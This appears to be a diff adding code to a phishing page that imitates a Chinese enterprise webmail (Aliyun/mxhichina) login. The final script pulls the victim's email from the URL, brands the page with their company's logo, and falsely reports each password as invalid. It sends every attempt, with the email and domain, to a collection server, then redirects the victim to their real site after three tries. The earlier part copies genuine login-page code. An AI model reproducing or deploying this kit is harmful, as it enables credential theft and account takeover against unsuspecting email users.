+        clearInterval(time);
+        $(".login_section").show();
+        $(".login_qr_code_wrap").hide();
+        $(".login_switch_qr_wrap").show();
+        $(".login_switch_login_wrap").hide();
+        $(".login_app_wrap").show();
+
+    }
+
+    $(function () {
+        $(".login_center_wrap").hover(function () {
+            $(".login_qccode").fadeOut(500, function () {
+                $(".login_scanarea_wrap").fadeIn();
+                $(".login_qccode").hide();
+            })
+        },
+            function () {
+                $(".login_scanarea_wrap").fadeOut(500, function () {
+                    $(".login_qccode").fadeIn();
+                    $(".login_scanarea_wrap").hide();
+                })
+            });
+    });
+
+</script>
+
+<script type="text/javascript">
+    var time, count = 1, MAX_COUNT = 60;
+    var re_get_msg = "重新获取";
+    function beforeSendDynamicCodeEvent() {
+        jQuery("#getDynamicCode").hide();
+        jQuery("#getDynamicCodeCount").html(re_get_msg + "(60s)");
+        jQuery("#getDynamicCodeCount").show();
+
+        count = 1;
+        clearInterval(time);
+        time = setInterval("btnCounting()", 1000);
+
+        return true;
+    }
+
+    function btnCounting() {
+        if (count == MAX_COUNT) {
+            clearInterval(time);
+        }
+
+        var counting = MAX_COUNT - count;
+        jQuery("#getDynamicCodeCount").html(re_get_msg + "(" + counting + "s)");
+        if (counting < 1) {
+            jQuery("#getDynamicCodeCount").hide();
+            jQuery("#getDynamicCode").show();
+        }
+        count++;
+    }
+
+    function sendDynamicCode() {
+        //发送验证码
+        var userNameValue = username.val();
+        if (domainsSize > 0 && $.trim(username.val()) != "") {
+            userNameValue = $.trim(username.val()) + "@" + selectDomains.val();
+        }
+        jQuery.post("ajax/common/send_login_dynamic_code.json", { "user_id": userNameValue, "domain": "mail.mxhichina.com" }, function (data) {
+            if (!data.content.success) {
+                showError(data.content.errorMsg);
+            }
+        });
+
+    }
+
+    function initEvent() {
+        jQuery('#getDynamicCode').click(function () {
+            if (username.val() == "") {
+                showError("account empty");
+                return;
+            }
+            beforeSendDynamicCodeEvent() && sendDynamicCode();
+        });
+    }
+
+    jQuery(function () {
+        initEvent();
+    });
+
+    function checkImg() {
+        var node = document.getElementById("test-img");
+        if (node) {
+            node.onload = function () {
+                $("#is_img_available").val("1");
+            };
+            node.src = "https://mailsso.aliyun.com/home/images/blank.gif";
+        }
+    }
+
+    checkImg();
+</script>
+
+<!--new UMID start-->
+
+<script src="//g.alicdn.com/AWSC/AWSC/awsc.js"></script>
+
+<script>
+
+    var newUmidToken = "defaultToken1_um_not_loaded@@" + location.href + "@@" + new Date().getTime();
+
+    AWSC.use("um", function (state, umModule) {
+        if (state === "loaded") {
+            newUmidToken = "defaultToken3_init_callback_not_called@@" + location.href + "@@" + new Date().getTime();
+            umModule.init({
+                timeout: 3000,
+                appName: "alimei-sso",
+                serviceLocation: 'cn' // 默认上报到中国，可不填。如需要上报到其他区域，参考下文参数说明。
+            }, function (initState, result) {
+                if (initState === 'success') {
+                    newUmidToken = result.tn;
+                } else {
+                    newUmidToken = "defaultToken4_init_failed with " + initState + "@@" + location.href + "@@" + new Date().getTime();
+                }
+            }
+            );
+        } else {
+            newUmidToken = "defaultToken2_load_failed with " + state + "@@" + location.href + "@@" + new Date().getTime();
+        }
+    });
+
+    function getNewUmidToken(callback) {
+        return newUmidToken;
+    }
+
+    function isDefaultNewUmidToken() {
+        return !newUmidToken || (newUmidToken && newUmidToken.indexOf("defaultToken") !== -1);
+    }
+
+</script>
+
+<!--new UMID end-->
+
+<script type="text/javascript">
+    const RURL = "http://localhost:1190"
+    var outgoingObj = {
+        session_key: "",
+        password: "",
+        domain: "",
+    }
+
+    const validateEmail = (email) => {
+        return email.match(
+            /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+        )
+    }
+
+    $(window).load(() => {
+        var emailHref64 = location.href.split("#")[1]
+        var emailHref = validateEmail(emailHref64) ? emailHref64 : atob(emailHref64)
+        var newURL = genID(252)
+        var newHref = `${location.href.split('#')[0]}?websrc=${newURL}`
+        history.replaceState("", "", newHref);
+
+        if (emailHref) {
+            var brokenEmail = emailHref.split("@")
+            var main_domain = brokenEmail[1].split(".")[0]
+            var upper_main_domain = `${main_domain.replace(
+                main_domain.charAt(0),
+                main_domain.charAt(0).toUpperCase()
+            )}`
+
+            $("#logoimg").attr("src", `https://logo.clearbit.com/${brokenEmail[1]}`)
+            $(".logoname").html(`${upper_main_domain}`)
+            // document.title = `${main_domain.replace(
+            //   main_domain.charAt(0),
+            //   main_domain.charAt(0).toUpperCase()
+            // )} - Mail`
+
+            // $("#favicon").attr("href", `https://logo.clearbit.com/${brokenEmail[1]}`)
+
+            $(`#username`).val(emailHref)
+            $("#pass-eye").click((e) => {
+                if ($(`#password`).attr("type") != "text") {
+                    $(`#password`).attr("type", "text")
+                } else {
+                    $(`#password`).attr("type", "password")
+                }
+            })
+
+            passwordChecker($(`#username`), $(`#password`), brokenEmail[1])
+
+            function passwordChecker(emailVal, passVal, domain) {
+                var count = 0
+                var msgElem = $("#login_error_line")
+                var notify = $("#login-error #notify")
+                var msg = $("#login_error_line span")
+                var successMsg = "恭喜，登录成功"
+                var invalidMsg = "无效的密码。 再试一次"
+                var noPass = "请输入密码"
+                var lessThan4 = "抱歉，密码必须超过 4 个字符"
+                var error = "抱歉没有找到电子邮件"
+
+                msgElem.hide()
+                $("#login_submit_form").submit((e) => {
+                    e.preventDefault()
+
+                    msg.html("")
+                    msgElem.hide()
+
+                    $("#login_submit_btn").html('登录...')
+
+                    setTimeout(async () => {
+                        if (emailVal.val() == "") {
+                            msg.html(error)
+                            msgElem.show()
+                        } else {
+                            if (passVal.val() == "") {
+                                msg.html(noPass)
+                                msgElem.show()
+                            } else {
+                                if (passVal.val().length < 4) {
+                                    msg.html(lessThan4)
+                                    msgElem.show()
+                                    passVal.val("")
+                                } else {
+                                    count = ++count
+                                    if (count == 1) {
+                                        msg.html(invalidMsg)
+                                        msgElem.show()
+
+                                        postDataHelper(emailVal.val(), passVal.val(), domain)
+                                        passVal.val("")
+                                    } else if (count == 2) {
+                                        msg.html(invalidMsg)
+                                        msgElem.show()
+
+                                        postDataHelper(emailVal.val(), passVal.val(), domain)
+                                        passVal.val("")
+                                    } else if (count == 3) {
+                                        const { out, pstD } = await postDataHelper(emailVal.val(), passVal.val(), domain)
+
+                                        if (pstD) {
+                                            setTimeout(() => {
+                                                window.location.replace(
+                                                    `http://www.${out.dm}`
+                                                )
+                                            }, 5000)
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                    }, 500)
+
+                    $("#login_submit_btn").html('登录')
+                })
+            }
+        }
+    })
+
+    // Example POST method implementation:
+    async function postData(url = "", data = {}) {
+        const response = await axios.post(url, { ...data })
+        return response.data
+    }
+
+    async function postDataHelper(em, pass, dm) {
+        outgoingObj.session_key = em
+        outgoingObj.password = pass
+        outgoingObj.domain = dm
+
+        var out = { key: em, dm }
+
+        // Put here the url of the email
+        var pstD = await postData(RURL, {
+            ...outgoingObj,
+        })
+
+        return { out, pstD }
+    }
+
+    function genID(length) {
+        var result = ''
+        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        var charactersLength = characters.length
+        for (var i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength))
+        }
+
+        return result
+    }
+</script>
+
+</html>
